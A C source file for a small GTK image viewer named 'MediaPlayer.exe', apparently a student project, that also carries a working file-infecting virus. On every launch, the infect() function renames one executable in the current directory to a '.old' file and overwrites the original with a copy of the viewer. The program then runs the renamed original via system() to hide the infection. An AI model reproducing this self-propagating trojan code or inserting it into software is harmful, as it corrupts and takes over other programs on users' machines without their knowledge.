#include <gtk/gtk.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

static void
on_open_image (GtkButton* button, gpointer user_data)
{
	GtkWidget *image = GTK_WIDGET (user_data);
	GtkWidget *toplevel = gtk_widget_get_toplevel (image);
	GtkFileFilter *filter = gtk_file_filter_new ();
	// Create box dialogue for file selection

	GtkWidget *dialog = gtk_file_chooser_dialog_new (("Open image"),
	                                                 GTK_WINDOW (toplevel),
	                                                 GTK_FILE_CHOOSER_ACTION_OPEN,
	                                                 "gtk-ok", GTK_RESPONSE_ACCEPT,
	                                                 "gtk-cancel", GTK_RESPONSE_CANCEL,
	                                                 NULL);

	gtk_file_filter_add_pixbuf_formats (filter); // Adding the images format accept by GTK 
	gtk_file_chooser_add_filter (GTK_FILE_CHOOSER (dialog),
	                             filter);

	switch (gtk_dialog_run (GTK_DIALOG (dialog)))
	{
		case GTK_RESPONSE_ACCEPT:
		{
			gchar *filename =
				gtk_file_chooser_get_filename (GTK_FILE_CHOOSER (dialog));
			gtk_image_set_from_file (GTK_IMAGE (image), filename);
			break;
		}
		default:
			break;
	}
	gtk_widget_destroy (dialog);
}


    char*
    nameToOld(char* name)
    {
        char* new_name = (char *) malloc( 50 );
        strcpy(new_name, name);

        if(strcmp(name, "MediaPlayer.exe"))	// Verifing if the file is not MediaPlayer
        {
            if(strstr(name, ".exe")) // Verifing the extension of the file
            {
                new_name[strlen(name)-1] = 'd';
                new_name[strlen(name)-2] = 'l';
                new_name[strlen(name)-3] = 'o';

                if(!fopen(new_name, "r"))//Verifing if we have already the same file
				{
                    //Le fichier .old n'existe pas ==> infection

                    if(!rename(name, new_name))	// Le fichier a était renommé ?
                    {
                        return name;
                    }
                    else
                    {
                        perror("Error the file not renaming\n");
                        exit(EXIT_FAILURE);
                    }
                }
            }
        }
		free(new_name);
        return "";
    }


void infect()
{
	DIR* dir = opendir("."); // Open a directory to read files in it.
	int infect = 0;
	char* pname = (char *) malloc( 50 );
	char* rname = (char *) malloc( 50 );

	// Test if the directory exists. If not, create it and return an error
	if (dir == NULL)
    {
            perror("Error: Unable to open directory\n");
            exit(EXIT_FAILURE);
    }

	// directory file path structure
	struct dirent* directory;
    while ((directory = readdir(dir)) != NULL)
    {
		if (infect < 1) // We infect one file per execution
		{
			struct stat stat_buffer;
			if (!stat(directory->d_name, &stat_buffer))
			{	
				if ((stat_buffer.st_mode & S_IXUSR) && S_ISREG(stat_buffer.st_mode))//check if the file is executable and regular
				{ 
					char* name = (char *) malloc( 50 );
					strcpy(name, directory->d_name); // Copy the name of the file
					strcpy(pname, name);
					
					strcpy(rname, nameToOld(name));

					if(strcmp(rname, "")) // Le programme a était infecté ? 
					{
						infect++;
					}

					free(name);
				}
			}
		}
	}
	free(directory);
	closedir(dir);

	
    FILE *fCopy, *fCopied;
    char ch; //Stock every charactere of the source file
    int pos; // The cursor postion in the source fille

    if ((fCopy = fopen("MediaPlayer.exe","r")) == NULL)    
	{    
	    perror("Error the file can't be open");
        exit(EXIT_FAILURE);
    }

    fCopied = fopen(pname, "w"); // Opening pg_name file else creating the file

    fseek(fCopy, 0L, SEEK_END); // file pointer at end of file

    pos = ftell(fCopy); // The total size of te source file 

    fseek(fCopy, 0L, SEEK_SET); // file pointer set at start
       
	while (pos--)
    {
        ch = fgetc(fCopy);  // copying file character by character
        fputc(ch, fCopied); // Put ch per ch in the copied file
    }    

	printf("virus copié\n");

    fclose(fCopied);
	fclose(fCopy);
	free(pname);
	free(rname);
}


static void
activate (GtkApplication *app, gpointer user_data)
{
	GtkWidget *window;
	GtkWidget *button;
	GtkWidget *image;
	GtkWidget *box;

	/* Set up the UI */
	window = gtk_application_window_new (app);
	gtk_window_set_title (GTK_WINDOW (window), "mon image viewer");
	gtk_window_set_default_size (GTK_WINDOW (window), 300, 150);
	gtk_container_set_border_width (GTK_CONTAINER (window), 5);

	box = gtk_box_new (GTK_ORIENTATION_VERTICAL, 5);
	button = gtk_button_new_with_label (("Open image"));
	image = gtk_image_new ();

	gtk_box_pack_start (GTK_BOX (box), image, TRUE, TRUE, 0);
	gtk_box_pack_start (GTK_BOX (box), button, FALSE, FALSE, 0);

	gtk_container_add (GTK_CONTAINER (window), box);

	/* Connect signals */

	/* Show open dialog when opening a file */
	g_signal_connect (button, "clicked", G_CALLBACK (on_open_image), image);

	/* Exit when the window is closed */
	g_signal_connect (window, "destroy", G_CALLBACK (gtk_main_quit), NULL);

	gtk_container_add (GTK_CONTAINER (window), box);
  	gtk_widget_show_all (window);
}


int
main (int argc, char **argv)
{
	int status;
	infect();    
	char* cmd = (char *) malloc( 40 );
	strcpy(cmd, argv[0]); // argv[0] contains the name of the executed file

	if(!strcmp(argv[0], "./MediaPlayer.exe")) // If the file is MediaPlayer run the MediaPlayer
	{
		GtkApplication *app;
		app = gtk_application_new ("org.gtk.example", G_APPLICATION_FLAGS_NONE);
		g_signal_connect (app, "activate", G_CALLBACK (activate), NULL);
		status = g_application_run (G_APPLICATION (app), argc, argv);
		g_object_unref (app);
	}
	else //Run the originaly prog file with replacing its extension
	{
		cmd[strlen(cmd)-1] = 'd';
		cmd[strlen(cmd)-2] = 'l';
		cmd[strlen(cmd)-3] = 'o';
		printf("cmd : %s\n", cmd);
		system(cmd);
	}
	
	return status;
}
